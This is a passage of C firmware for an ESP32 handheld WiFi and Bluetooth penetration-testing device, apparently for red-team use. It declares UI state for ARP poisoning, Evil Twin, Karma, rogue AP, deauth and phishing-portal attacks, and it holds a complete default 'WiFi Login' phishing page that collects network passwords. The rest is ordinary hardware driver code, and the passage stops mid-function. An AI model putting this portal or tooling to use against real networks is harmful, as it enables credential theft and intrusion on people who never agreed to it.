// Phishing Portal - uses per-tab context (ctx->phishing_portal_*)

// Wardrive - uses per-tab context (ctx->wardrive_*)

// ARP Poison page
static lv_obj_t *arp_poison_page = NULL;
static lv_obj_t *arp_password_input = NULL;
static lv_obj_t *arp_keyboard = NULL;
static lv_obj_t *arp_connect_btn = NULL;
static lv_obj_t *arp_status_label = NULL;
static lv_obj_t *arp_hosts_container = NULL;
static lv_obj_t *arp_list_hosts_btn = NULL;
static char arp_target_ssid[33] = {0};
static char arp_our_ip[20] = {0};
static bool arp_wifi_connected = false;

// Rogue AP page (legacy globals for compatibility)
static lv_obj_t *rogue_ap_page = NULL;
static lv_obj_t *rogue_ap_password_input = NULL;
static lv_obj_t *rogue_ap_keyboard = NULL;
static lv_obj_t *rogue_ap_html_dropdown = NULL;
static lv_obj_t *rogue_ap_start_btn = NULL;
static char rogue_ap_ssid[33] = {0};
static char rogue_ap_password[65] = {0};
static volatile bool rogue_ap_monitoring = false;
static TaskHandle_t rogue_ap_monitor_task_handle = NULL;

// ARP Poison popup (attack active)

// ARP Host storage (global legacy - type defined earlier)
static arp_host_t arp_hosts[ARP_MAX_HOSTS];
static int arp_host_count = 0;

// Evil Twin -> ARP integration (auto-connect mode)
static char arp_target_password[65] = {0};  // Password from Evil Twin
static bool arp_auto_mode = false;          // True when coming from Evil Twin
static lv_obj_t *evil_twin_connect_popup_overlay = NULL;
static lv_obj_t *evil_twin_connect_popup_obj = NULL;

// Evil Twin entry storage for row clicks (global legacy - type defined earlier)
static evil_twin_entry_t evil_twin_entries[EVIL_TWIN_MAX_ENTRIES];
static int evil_twin_entry_count = 0;

// Karma Attack page
static lv_obj_t *karma_page = NULL;
static lv_obj_t *karma_probes_container = NULL;
static lv_obj_t *karma_status_label = NULL;
static lv_obj_t *karma_start_sniffer_btn = NULL;
static lv_obj_t *karma_stop_sniffer_btn = NULL;
static bool karma_sniffer_running = false;

// Karma HTML selection popup
static lv_obj_t *karma_html_popup_overlay = NULL;
static lv_obj_t *karma_html_popup_obj = NULL;
static lv_obj_t *karma_html_dropdown = NULL;
static int karma_selected_probe_idx = -1;

// Karma attack popup (active attack)
static lv_obj_t *karma_attack_popup_overlay = NULL;
static lv_obj_t *karma_attack_popup_obj = NULL;
static lv_obj_t *karma_attack_ssid_label = NULL;
static lv_obj_t *karma_attack_mac_label = NULL;
static lv_obj_t *karma_attack_password_label = NULL;
static volatile bool karma_monitoring = false;
static TaskHandle_t karma_monitor_task_handle = NULL;

// Karma probe storage (global legacy - type defined earlier)
static karma_probe_t karma_probes[KARMA_MAX_PROBES];
static int karma_probe_count = 0;

// Karma HTML files (reuse evil twin storage)
static char karma_html_files[20][64];
static int karma_html_count = 0;

// ============================================================================
// Captive Portal (for Probes & Karma on Network Observer)
// ============================================================================
#define DNS_MAX_PACKET_SIZE 512
#define PORTAL_HTML_MAX_SIZE 32768

static httpd_handle_t portal_server = NULL;
static bool portal_active = false;
static char *portal_ssid = NULL;
static char *custom_portal_html = NULL;
static int dns_server_socket = -1;
static TaskHandle_t dns_server_task_handle = NULL;
static esp_netif_t *ap_netif = NULL;

// Probes & Karma popup elements
static lv_obj_t *karma2_probes_popup_overlay = NULL;
static lv_obj_t *karma2_probes_popup_obj = NULL;
static lv_obj_t *karma2_html_popup_overlay = NULL;
static lv_obj_t *karma2_html_popup_obj = NULL;
static lv_obj_t *karma2_html_dropdown = NULL;
static lv_obj_t *karma2_attack_popup_overlay = NULL;
static lv_obj_t *karma2_attack_popup_obj = NULL;
static lv_obj_t *karma2_attack_status_label = NULL;

// Probes storage (from UART) - constant defined earlier
static char karma2_probes[KARMA2_MAX_PROBES][33];
static int karma2_probe_count = 0;
static int karma2_selected_probe_idx = -1;

// HTML files for captive portal - constant defined earlier
static char karma2_html_files[KARMA2_MAX_HTML_FILES][64];
static int karma2_html_count = 0;

// Ad Hoc Portal page (INTERNAL tab)
static lv_obj_t *adhoc_portal_page = NULL;
static lv_obj_t *adhoc_portal_status_label = NULL;
static lv_obj_t *adhoc_portal_data_label = NULL;
static lv_obj_t *adhoc_probes_popup_overlay = NULL;
static lv_obj_t *adhoc_probes_popup_obj = NULL;
static lv_obj_t *adhoc_html_popup_overlay = NULL;
static lv_obj_t *adhoc_html_popup_obj = NULL;
static lv_obj_t *adhoc_html_dropdown = NULL;
static char adhoc_probes[KARMA2_MAX_PROBES * 2][33];  // Double size for union of both UARTs
static int adhoc_probe_count = 0;
static int adhoc_selected_probe_idx = -1;
static char portal_selected_html[64] = {0};  // Track which HTML file was selected

// Default portal HTML (fallback)
static const char *default_portal_html = 
    "<!DOCTYPE html><html><head>"
    "<meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
    "<title>WiFi Login</title>"
    "<style>"
    "body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); margin: 0; padding: 20px; min-height: 100vh; }"
    ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 40px rgba(0,0,0,0.3); }"
    "h1 { text-align: center; color: #333; margin-bottom: 30px; }"
    "input { width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }"
    "input:focus { border-color: #667eea; outline: none; }"
    "button { width: 100%; padding: 15px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; margin-top: 20px; }"
    "button:hover { opacity: 0.9; }"
    "</style>"
    "</head>"
    "<body>"
    "<div class='container'>"
    "<h1>WiFi Login</h1>"
    "<form action='/login' method='POST'>"
    "<input type='password' name='password' placeholder='Enter WiFi Password' required>"
    "<button type='submit'>Connect</button>"
    "</form>"
    "</div>"
    "</body></html>";

// Deauth Detector (global legacy - type defined earlier)
static deauth_entry_t deauth_entries[DEAUTH_DETECTOR_MAX_ENTRIES];
static int deauth_entry_count = 0;
static lv_obj_t *deauth_detector_page = NULL;
static lv_obj_t *deauth_table = NULL;
static lv_obj_t *deauth_start_btn = NULL;
static lv_obj_t *deauth_stop_btn = NULL;
static volatile bool deauth_detector_running = false;
static TaskHandle_t deauth_detector_task_handle = NULL;

// Bluetooth menu
static lv_obj_t *bt_menu_page = NULL;
static lv_obj_t *bt_airtag_page = NULL;
static lv_obj_t *bt_scan_page = NULL;
static lv_obj_t *bt_locator_page = NULL;

// AirTag scan
static lv_obj_t *airtag_count_label = NULL;
static lv_obj_t *smarttag_count_label = NULL;
static volatile bool airtag_scanning = false;
static TaskHandle_t airtag_scan_task_handle = NULL;

// BT Locator tracking
static char bt_locator_target_mac[18] = {0};
static char bt_locator_target_name[64] = {0};
static lv_obj_t *bt_locator_rssi_label = NULL;
static volatile bool bt_locator_tracking = false;
static TaskHandle_t bt_locator_task_handle = NULL;

// BT device storage (global legacy - type defined earlier)
static bt_device_t bt_devices[BT_MAX_DEVICES];
static int bt_device_count = 0;

// Restore LVGL object pointers from context to globals (call after tab switch)
// This is needed because update_xxx functions use global pointers
static void restore_ui_pointers_from_ctx(tab_context_t *ctx) {
    if (!ctx) return;
    
    if (ctx->observer_table) {
        observer_table = ctx->observer_table;
    }
    if (ctx->scan_page) {
        scan_page = ctx->scan_page;
    }
    if (ctx->observer_page) {
        observer_page = ctx->observer_page;
    }
}

// Forward declarations
static void show_main_tiles(void);
static void show_scan_page(void);
static void show_observer_page(void);
static void show_esp_modem_page(void);
static void show_settings_page(void);
static void main_tile_event_cb(lv_event_t *e);
static void back_btn_event_cb(lv_event_t *e);
static void network_checkbox_event_cb(lv_event_t *e);
static void attack_tile_event_cb(lv_event_t *e);
static void create_status_bar(void);
static void screenshot_click_cb(lv_event_t *e);
static void save_screenshot_to_sd(void);
static void show_global_attacks_page(void);
static void global_attack_tile_event_cb(lv_event_t *e);
static void observer_back_btn_event_cb(lv_event_t *e);
static void esp_modem_back_btn_event_cb(lv_event_t *e);
static void esp_modem_scan_btn_click_cb(lv_event_t *e);
static esp_err_t esp_modem_wifi_init(void);
static void network_row_click_cb(lv_event_t *e);
static void client_row_click_cb(lv_event_t *e);
static void show_network_popup(int network_idx);
static void close_network_popup(void);
static void show_deauth_popup(int network_idx, int client_idx);
static void close_deauth_popup(void);
static void deauth_btn_click_cb(lv_event_t *e);
static void update_observer_table(tab_context_t *ctx);
static bool parse_sniffer_network_line(const char *line, observer_network_t *net);
static bool parse_sniffer_client_line(const char *line, char *mac_out, size_t mac_size);
static void show_scan_deauth_popup(void);
static void scan_deauth_popup_close_cb(lv_event_t *e);
static void fetch_html_files_from_sd(void);
static void show_evil_twin_popup(void);
static void evil_twin_start_cb(lv_event_t *e);
static void do_evil_twin_start(void);
static void evil_twin_close_cb(lv_event_t *e);
static void evil_twin_monitor_task(void *arg);
static void show_sae_popup(int network_idx);
static void sae_popup_close_cb(lv_event_t *e);
static void show_handshaker_popup(void);
static void handshaker_popup_close_cb(lv_event_t *e);
static void handshaker_monitor_task(void *arg);
static void show_arp_poison_page(void);
static void show_rogue_ap_page(void);
static void show_rogue_ap_popup(tab_context_t *ctx);
static void arp_poison_back_cb(lv_event_t *e);
static void arp_connect_cb(lv_event_t *e);
static void arp_list_hosts_cb(lv_event_t *e);
static void arp_host_click_cb(lv_event_t *e);
static void arp_attack_popup_close_cb(lv_event_t *e);
static void evil_twin_row_click_cb(lv_event_t *e);
static void show_evil_twin_connect_popup(const char *ssid, const char *password);
static void evil_twin_connect_popup_yes_cb(lv_event_t *e);
static void evil_twin_connect_popup_cancel_cb(lv_event_t *e);
static void arp_auto_connect_timer_cb(lv_timer_t *timer);
static void show_karma_page(void);
static void show_adhoc_portal_page(void);  // INTERNAL tab Ad Hoc Portal page
static void adhoc_portal_back_cb(lv_event_t *e);
static void adhoc_portal_stop_cb(lv_event_t *e);
static void adhoc_show_probes_cb(lv_event_t *e);
static void adhoc_fetch_probes_from_all_uarts(void);
static void adhoc_probe_click_cb(lv_event_t *e);
static void adhoc_html_popup_close_cb(lv_event_t *e);
static void adhoc_html_select_cb(lv_event_t *e);
static void switch_to_adhoc_portal_page(void);
static void karma_back_cb(lv_event_t *e);
static void karma_start_sniffer_cb(lv_event_t *e);
static void karma_stop_sniffer_cb(lv_event_t *e);
static void karma_show_probes_cb(lv_event_t *e);
static void karma_probe_click_cb(lv_event_t *e);
static void karma_html_popup_close_cb(lv_event_t *e);
static void karma_html_select_cb(lv_event_t *e);
static void do_karma_attack_start(void);
static void karma_attack_popup_close_cb(lv_event_t *e);
static void karma_monitor_task(void *arg);

// Captive Portal (Probes & Karma on Network Observer)
static void observer_karma_btn_cb(lv_event_t *e);
static void karma2_fetch_probes(void);
static void karma2_probe_click_cb(lv_event_t *e);
static void karma2_probes_popup_close_cb(lv_event_t *e);
static void show_karma2_html_popup(void);
static void karma2_html_popup_close_cb(lv_event_t *e);
static void karma2_html_select_cb(lv_event_t *e);
static void karma2_fetch_html_files(void);
static esp_err_t start_captive_portal(const char *ssid);
static void stop_captive_portal(void);
static void dns_server_task(void *pvParameters);
static esp_err_t portal_root_handler(httpd_req_t *req);
static esp_err_t portal_page_handler(httpd_req_t *req);
static esp_err_t portal_login_handler(httpd_req_t *req);
static esp_err_t portal_get_handler(httpd_req_t *req);
static esp_err_t portal_save_handler(httpd_req_t *req);
static esp_err_t android_captive_handler(httpd_req_t *req);
static esp_err_t ios_captive_handler(httpd_req_t *req);
static esp_err_t captive_detection_handler(httpd_req_t *req);
static esp_err_t captive_portal_redirect_handler(httpd_req_t *req);
static void show_karma2_attack_popup(const char *ssid);
static void karma2_attack_stop_cb(lv_event_t *e);
static void save_portal_data(const char *ssid, const char *form_data);

static void show_scan_overlay(void);
static void hide_scan_overlay(void);
static void show_evil_twin_loading_overlay(void);
static void hide_evil_twin_loading_overlay(void);
static void show_splash_screen(void);
static void splash_timer_cb(lv_timer_t *timer);
static void play_startup_beep(void);
static void settings_tile_event_cb(lv_event_t *e);
static void settings_back_btn_event_cb(lv_event_t *e);
static void show_scan_time_popup(void);
static void show_red_team_settings_page(void);
static void show_screen_timeout_popup(void);
static void show_screen_brightness_popup(void);
static void get_uart1_pins(int *tx_pin, int *rx_pin);
static void get_uart2_pins(int *tx_pin, int *rx_pin);
static void init_uart2(void);
static void deinit_uart2(void);
static void load_red_team_from_nvs(void);
static void detect_boards(void);
static bool check_sd_card_for_tab(tab_id_t tab);
static void check_all_sd_cards(void);
static void show_no_board_popup(void);
static void board_detect_retry_cb(lv_timer_t *timer);
static void board_detect_popup_close_cb(lv_event_t *e);
static void reload_gui_for_detection(void);
static void show_detection_popup(void);
static void detection_complete_cb(lv_timer_t *timer);
static void update_portal_icon(void);
static void karma2_attack_background_cb(lv_event_t *e);

// Tab-based UI functions
static void create_tab_bar(void);
static void tab_click_cb(lv_event_t *e);
static void show_uart1_tiles(void);
static void show_mbus_tiles(void);
static void show_internal_tiles(void);
static void update_tab_styles(void);
static uart_port_t get_current_uart(void);
static void uart_send_command_for_tab(const char *cmd);
static void show_blackout_confirm_popup(void);
static void blackout_confirm_yes_cb(lv_event_t *e);
static void blackout_confirm_no_cb(lv_event_t *e);
static void show_blackout_active_popup(void);
static void blackout_stop_cb(lv_event_t *e);
static void show_snifferdog_confirm_popup(void);
static void snifferdog_confirm_yes_cb(lv_event_t *e);
static void snifferdog_confirm_no_cb(lv_event_t *e);
static void show_sd_warning_popup(sd_warning_continue_cb_t continue_action);
static void sd_warning_continue_cb(lv_event_t *e);
static void sd_warning_cancel_cb(lv_event_t *e);
static bool current_tab_has_sd_card(void);
static void show_snifferdog_active_popup(void);
static void snifferdog_stop_cb(lv_event_t *e);
static void show_global_handshaker_confirm_popup(void);
static void global_handshaker_confirm_yes_cb(lv_event_t *e);
static void global_handshaker_confirm_no_cb(lv_event_t *e);
static void show_global_handshaker_active_popup(void);
static void global_handshaker_stop_cb(lv_event_t *e);
static void global_handshaker_monitor_task(void *arg);
static void show_phishing_portal_popup(void);
static void phishing_portal_start_cb(lv_event_t *e);
static void do_phishing_portal_start(tab_context_t *ctx);
static void phishing_portal_close_cb(lv_event_t *e);
static void phishing_portal_stop_cb(lv_event_t *e);
static void phishing_portal_monitor_task(void *arg);
static void show_wardrive_page(void);
static void wardrive_start_cb(lv_event_t *e);
static void wardrive_stop_cb(lv_event_t *e);
static void wardrive_back_cb(lv_event_t *e);
static void wardrive_monitor_task(void *arg);
static void update_wardrive_table(tab_context_t *ctx);
static void close_wardrive_gps_overlay(tab_context_t *ctx);
static void wardrive_gps_type_btn_cb(lv_event_t *e);
static void wardrive_gps_type_close_cb(lv_event_t *e);
static void wardrive_gps_set_m5_cb(lv_event_t *e);
static void wardrive_gps_set_atgm_cb(lv_event_t *e);
static void show_compromised_data_page(void);
static void compromised_data_tile_event_cb(lv_event_t *e);
static void compromised_data_back_btn_event_cb(lv_event_t *e);
static void show_evil_twin_passwords_page(void);
static void show_portal_data_page(void);
static void show_handshakes_page(void);
static void show_deauth_detector_page(void);
static void deauth_detector_back_btn_event_cb(lv_event_t *e);
static void deauth_detector_start_cb(lv_event_t *e);
static void deauth_detector_stop_cb(lv_event_t *e);
static void deauth_detector_task(void *arg);
static void update_deauth_table(void);
static void show_bluetooth_menu_page(void);
static void bt_menu_tile_event_cb(lv_event_t *e);
static void bt_menu_back_btn_event_cb(lv_event_t *e);
static void show_airtag_scan_page(void);
static void airtag_scan_back_btn_event_cb(lv_event_t *e);
static void airtag_scan_task(void *arg);
static void show_bt_scan_page(void);
static void bt_scan_back_btn_event_cb(lv_event_t *e);
static void bt_scan_rescan_cb(lv_event_t *e);
static void bt_scan_device_click_cb(lv_event_t *e);
static void show_bt_locator_page(int device_idx);
static void bt_locator_tracking_back_btn_event_cb(lv_event_t *e);
static void bt_locator_tracking_task(void *arg);

//==================================================================================
// INA226 Power Monitor Driver
//==================================================================================

static esp_err_t ina226_init(void)
{
    if (ina226_initialized) {
        return ESP_OK;
    }
    
    i2c_master_bus_handle_t i2c_bus = bsp_i2c_get_handle();
    if (i2c_bus == NULL) {
        ESP_LOGE(TAG, "I2C bus not initialized");
        return ESP_ERR_INVALID_STATE;
    }
    
    // Probe for INA226 at default address
    esp_err_t ret = i2c_master_probe(i2c_bus, INA226_I2C_ADDR, 100);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "INA226 not found at address 0x%02X", INA226_I2C_ADDR);
        return ret;
    }
    
    // Add INA226 device to I2C bus
    i2c_device_config_t dev_cfg = {
        .dev_addr_length = I2C_ADDR_BIT_LEN_7,
        .device_address = INA226_I2C_ADDR,
        .scl_speed_hz = 100000,  // 100kHz
    };
    
    ret = i2c_master_bus_add_device(i2c_bus, &dev_cfg, &ina226_dev_handle);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to add INA226 device: %s", esp_err_to_name(ret));
        return ret;
    }
    
    // Verify manufacturer ID (should be 0x5449 for TI)
    uint8_t reg = INA226_REG_MFG_ID;
    uint8_t data[2];
    ret = i2c_master_transmit_receive(ina226_dev_handle, &reg, 1, data, 2, 100);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to read INA226 manufacturer ID: %s", esp_err_to_name(ret));
        i2c_master_bus_rm_device(ina226_dev_handle);
        ina226_dev_handle = NULL;
        return ret;
    }
    
        uint16_t mfg_id = (data[0] << 8) | data[1];
        ESP_LOGI(TAG, "INA226 Manufacturer ID: 0x%04X (expected 0x5449)", mfg_id);
    
    if (mfg_id != 0x5449) {
        ESP_LOGE(TAG, "INA226 manufacturer ID mismatch - device not responding correctly");
        i2c_master_bus_rm_device(ina226_dev_handle);
        ina226_dev_handle = NULL;
        return ESP_ERR_INVALID_RESPONSE;
    }
    
    // Configure INA226: AVG=16, 1100us conversion times, continuous mode
    // Using INA226_CONFIG_VALUE (0x4527) from M5Tab5 official demo
    uint8_t config_cmd[3] = {INA226_REG_CONFIG, (INA226_CONFIG_VALUE >> 8) & 0xFF, INA226_CONFIG_VALUE & 0xFF};
    ret = i2c_master_transmit(ina226_dev_handle, config_cmd, 3, 100);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to configure INA226: %s", esp_err_to_name(ret));
        i2c_master_bus_rm_device(ina226_dev_handle);
        ina226_dev_handle = NULL;
        return ret;
    }
    
    // Calibrate for current/power measurements
    // Cal = 0.00512 / (currentLSB * Rshunt)
    // With Rshunt=0.005 and maxI=8.192A: currentLSB = 8.192/32767 ≈ 0.00025
    // Cal = 0.00512 / (0.00025 * 0.005) = 4096 = 0x1000
    uint8_t calib_cmd[3] = {INA226_REG_CALIB, 0x10, 0x00};
    ret = i2c_master_transmit(ina226_dev_handle, calib_cmd, 3, 100);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "Failed to calibrate INA226: %s (voltage readings will still work)", esp_err_to_name(ret));
        // Don't fail - voltage readings will still work
    }
    
    ina226_initialized = true;
    ESP_LOGI(TAG, "INA226 Power Monitor initialized successfully at address 0x%02X", INA226_I2C_ADDR);
    return ESP_OK;
}

static float ina226_read_bus_voltage(void)
{
    if (!ina226_initialized || ina226_dev_handle == NULL) {
        return 0.0f;
    }
    
    uint8_t reg = INA226_REG_BUS_VOLT;
    uint8_t data[2];
    
    esp_err_t ret = i2c_master_transmit_receive(ina226_dev_handle, &reg, 1, data, 2, 100);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "Failed to read INA226 bus voltage: %s", esp_err_to_name(ret));
        return 0.0f;
    }
    
    // Bus voltage register is 16-bit, 1.25mV per LSB
    uint16_t raw_voltage = (data[0] << 8) | data[1];
    // Use same formula as official M5Tab5 demo: voltage * 0.00125 (V)
    float voltage_v = raw_voltage * 0.00125f;
    
    ESP_LOGD(TAG, "INA226 raw: 0x%04X (%u), voltage: %.3fV", raw_voltage, raw_voltage, voltage_v);
    
    return voltage_v;
}

//==================================================================================
// Battery Status Functions
//==================================================================================

static bool get_charging_status(void)
{
    // Use USB-C detection as proxy for charging status
    // When USB-C is connected and charging is enabled, device is charging
    return bsp_usb_c_detect();
}

static void update_battery_status(void)
{
    current_battery_voltage = ina226_read_bus_voltage();
    current_charging_status = get_charging_status();
}

static void battery_status_timer_cb(lv_timer_t *timer)
{
    (void)timer;
    
    // Read new values
    update_battery_status();
    
    // Memory stats
    size_t psram_free = heap_caps_get_free_size(MALLOC_CAP_SPIRAM);
    size_t psram_min = heap_caps_get_minimum_free_size(MALLOC_CAP_SPIRAM);
    size_t sram_free = heap_caps_get_free_size(MALLOC_CAP_INTERNAL);
    size_t sram_min = heap_caps_get_minimum_free_size(MALLOC_CAP_INTERNAL);
    size_t dma_free = heap_caps_get_free_size(MALLOC_CAP_DMA);
    size_t dma_min = heap_caps_get_minimum_free_size(MALLOC_CAP_DMA);
    
    // Memory stats only (no battery log to reduce noise)
    ESP_LOGD(TAG, "Memory - PSRAM: %u KB free (min: %u KB) | SRAM: %u KB free (min: %u KB) | DMA: %u KB free (min: %u KB)",
             (unsigned)(psram_free / 1024), (unsigned)(psram_min / 1024),
             (unsigned)(sram_free / 1024), (unsigned)(sram_min / 1024),
             (unsigned)(dma_free / 1024), (unsigned)(dma_min / 1024));
    
    // Update UI labels
    if (battery_voltage_label) {
        if (current_battery_voltage > 0.1f) {
            // Use snprintf instead of lv_label_set_text_fmt for float support
            char voltage_str[16];
            snprintf(voltage_str, sizeof(voltage_str), "%.2fV", current_battery_voltage);
            lv_label_set_text(battery_voltage_label, voltage_str);
        } else {
            lv_label_set_text(battery_voltage_label, "-- V");
        }
    }
    
    if (charging_status_label) {
        if (current_charging_status) {
            // Just icon, no text - saves space
            lv_label_set_text(charging_status_label, LV_SYMBOL_CHARGE);
            lv_obj_set_style_text_color(charging_status_label, lv_color_make(76, 175, 80), 0);  // Green
        } else {
            lv_label_set_text(charging_status_label, LV_SYMBOL_BATTERY_FULL);
            lv_obj_set_style_text_color(charging_status_label, lv_color_make(255, 255, 255), 0);  // White
        }
    }
}

// Get screen timeout in milliseconds based on setting
static uint32_t get_screen_timeout_ms(void)
{
    switch (screen_timeout_setting) {
        case 0: return 10000;      // 10s
        case 1: return 30000;      // 30s
        case 2: return 60000;      // 1min
        case 3: return 300000;     // 5min
        case 4: return UINT32_MAX; // Stays On (effectively never)
        default: break;
    }
    return 30000;  // Default fallback
}

// Set display brightness with gamma correction using full 12-bit LEDC precision.
// Direct LEDC control gives 4096 steps (0-4095) with 200Hz PWM for proper LED dimming.
// Gamma 2.2 maps slider percentage to perceived linear brightness.
#define BRIGHTNESS_LEDC_CH      LEDC_CHANNEL_1
#define BRIGHTNESS_LEDC_MAX     4095  // 12-bit resolution
static void set_brightness_gamma(uint8_t percent)
{
    uint32_t duty;
    if (percent == 0) {
        duty = 0;
    } else if (percent >= 100) {
        duty = BRIGHTNESS_LEDC_MAX;
    } else {
        float normalized = percent / 100.0f;
        float corrected = powf(normalized, 2.2f);
        duty = (uint32_t)(corrected * BRIGHTNESS_LEDC_MAX + 0.5f);
        if (duty < 1) duty = 1;
    }
    ESP_LOGI(TAG, "Brightness: slider %d%% -> duty %lu/4095", percent, (unsigned long)duty);
    ledc_set_duty(LEDC_LOW_SPEED_MODE, BRIGHTNESS_LEDC_CH, duty);
    ledc_update_duty(LEDC_LOW_SPEED_MODE, BRIGHTNESS_LEDC_CH);
}

// Wake screen helper - restores brightness and clears dimmed state
static void wake_screen(const char *source)
{
    if (sleep_overlay) {
        lv_obj_delete(sleep_overlay);
        sleep_overlay = NULL;
    }
    
    set_brightness_gamma(screen_brightness_setting);  // Restore brightness with gamma correction
    screen_dimmed = false;
    last_activity_time = lv_tick_get();
    ESP_LOGI(TAG, "Screen woken by %s (brightness %d%%)", source, screen_brightness_setting);
}

// Sleep overlay click callback - wakes screen and removes overlay (GT911 only)
static void sleep_overlay_click_cb(lv_event_t *e)
{
    (void)e;
    wake_screen("touch");
}

// Screen timeout timer callback - dims screen after inactivity and handles wake
static void screen_timeout_timer_cb(lv_timer_t *timer)
{
    (void)timer;
    
    // If screen is dimmed, touch overlay handles wake via sleep_overlay_click_cb
    if (screen_dimmed) {
        return;
    }
    
    uint32_t now = lv_tick_get();
    uint32_t timeout_ms = get_screen_timeout_ms();
    if (timeout_ms != UINT32_MAX && (now - last_activity_time) >= timeout_ms) {
        bsp_display_brightness_set(0);  // Turn off backlight
        screen_dimmed = true;
        
        // Create invisible overlay to capture wake touch
        sleep_overlay = lv_obj_create(lv_layer_top());
        lv_obj_remove_style_all(sleep_overlay);
        lv_obj_set_size(sleep_overlay, LV_PCT(100), LV_PCT(100));
        lv_obj_set_style_bg_opa(sleep_overlay, LV_OPA_TRANSP, 0);
        lv_obj_add_flag(sleep_overlay, LV_OBJ_FLAG_CLICKABLE);
        lv_obj_add_event_cb(sleep_overlay, sleep_overlay_click_cb, LV_EVENT_CLICKED, NULL);
        
        ESP_LOGI(TAG, "Screen dimmed (touch to wake)");
    }
}

// Touch activity callback - resets inactivity timer on any touch
static void touch_activity_cb(lv_event_t *e)
{
    (void)e;
    
    // Only update activity time if screen is not dimmed
    // (when dimmed, the overlay handles everything)
    if (!screen_dimmed) {
        last_activity_time = lv_tick_get();
    }
}

static bool usb_transport_ready = false;
static bool usb_transport_warned = false;
static usbh_cdc_handle_t usb_cdc_handle = NULL;
static bool usb_cdc_connected = false;
static bool usb_host_checked = false;
static bool usb_host_installed = false;
static bool usb_host_started_by_us = false;
static uint32_t usb_next_retry_ms = 0;
static bool usb_log_tuned = false;
static bool board_redetect_pending = false;
static bool usb_debug_logs = true;
static bool usb_cdc_preferred_valid = false;
static uint8_t usb_cdc_preferred_itf = 0;
static uint16_t usb_last_vid = 0;
static uint16_t usb_last_pid = 0;

#define CP210X_VID 0x10C4
#define CP210X_REQTYPE_HOST_TO_DEVICE 0x41
#define CP210X_IFC_ENABLE 0x00
#define CP210X_SET_LINE_CTL 0x03
#define CP210X_SET_MHS 0x07
#define CP210X_SET_BAUDRATE 0x1E

#define CP210X_UART_ENABLE 0x0001

#define CP210X_BITS_DATA_8 0x0800
#define CP210X_BITS_PARITY_NONE 0x0000
#define CP210X_BITS_STOP_1 0x0000

#define CP210X_CONTROL_DTR 0x0001
#define CP210X_CONTROL_RTS 0x0002
#define CP210X_CONTROL_WRITE_DTR 0x0100
#define CP210X_CONTROL_WRITE_RTS 0x0200

static void cp210x_send_simple_request(uint8_t request, uint16_t value, uint16_t index)
{
    if (!usb_cdc_handle) {
        return;
    }
    esp_err_t err = usbh_cdc_send_custom_request(usb_cdc_handle,
                                                 CP210X_REQTYPE_HOST_TO_DEVICE,
                                                 request,
                                                 value,
                                                 index,
                                                 0,
                                                 NULL);
    if (usb_debug_logs && err != ESP_OK) {
        ESP_LOGW(TAG, "[USB][CP210X] request 0x%02X failed: %s", request, esp_err_to_name(err));
    }
}

static void cp210x_send_baudrate(uint32_t baud, uint16_t index)
{
    if (!usb_cdc_handle) {
        return;
    }
    uint8_t data[4];
    data[0] = (uint8_t)(baud & 0xFF);
    data[1] = (uint8_t)((baud >> 8) & 0xFF);
    data[2] = (uint8_t)((baud >> 16) & 0xFF);
    data[3] = (uint8_t)((baud >> 24) & 0xFF);
    esp_err_t err = usbh_cdc_send_custom_request(usb_cdc_handle,
                                                 CP210X_REQTYPE_HOST_TO_DEVICE,
                                                 CP210X_SET_BAUDRATE,
                                                 0,
                                                 index,
                                                 sizeof(data),
                                                 data);
    if (usb_debug_logs && err != ESP_OK) {
        ESP_LOGW(TAG, "[USB][CP210X] SET_BAUDRATE failed: %s", esp_err_to_name(err));
    }
}

static void cp210x_init_port(uint16_t index)
{
    uint16_t line_ctl = CP210X_BITS_DATA_8 | CP210X_BITS_PARITY_NONE | CP210X_BITS_STOP_1;
    uint16_t mhs = CP210X_CONTROL_WRITE_DTR | CP210X_CONTROL_WRITE_RTS |
                   CP210X_CONTROL_DTR | CP210X_CONTROL_RTS;

    cp210x_send_simple_request(CP210X_IFC_ENABLE, CP210X_UART_ENABLE, index);
    cp210x_send_simple_request(CP210X_SET_LINE_CTL, line_ctl, index);
    cp210x_send_baudrate(UART_BAUD_RATE, index);
    cp210x_send_simple_request(CP210X_SET_MHS, mhs, index);

    if (usb_debug_logs) {
        ESP_LOGI(TAG, "[USB][CP210X] init done: itf=%u baud=%u line=0x%04X mhs=0x%04X",
                 index, (unsigned)UART_BAUD_RATE, line_ctl, mhs);
    }
}

static void usb_cdc_new_dev_cb(usb_device_handle_t usb_dev, void *user_data)
{
    (void)user_data;

    const usb_device_desc_t *device_desc = NULL;
    const usb_config_desc_t *config_desc = NULL;
    esp_err_t dev_err = usb_host_get_device_descriptor(usb_dev, &device_desc);
    esp_err_t cfg_err = usb_host_get_active_config_descriptor(usb_dev, &config_desc);
    if (dev_err != ESP_OK || cfg_err != ESP_OK || !device_desc || !config_desc) {
        if (usb_debug_logs) {
            ESP_LOGW(TAG, "[USB] new_dev_cb: desc error dev=%s cfg=%s",
                     esp_err_to_name(dev_err), esp_err_to_name(cfg_err));
        }
        return;
    }

    usb_last_vid = device_desc->idVendor;
    usb_last_pid = device_desc->idProduct;
    usb_cdc_preferred_valid = false;
    usb_cdc_preferred_itf = 0;

    int desc_offset = 0;
    const usb_standard_desc_t *this_desc = (const usb_standard_desc_t *)config_desc;
    while ((this_desc = usb_parse_next_descriptor_of_type(this_desc,
                                                         config_desc->wTotalLength,
                                                         USB_B_DESCRIPTOR_TYPE_INTERFACE,
                                                         &desc_offset))) {
        const usb_intf_desc_t *intf_desc = (const usb_intf_desc_t *)this_desc;
        if (intf_desc->bInterfaceClass == USB_CLASS_CDC_DATA) {
            usb_cdc_preferred_itf = intf_desc->bInterfaceNumber;
            usb_cdc_preferred_valid = true;
            break;
        }
    }

    if (!usb_cdc_preferred_valid) {
        int intf_offset = 0;
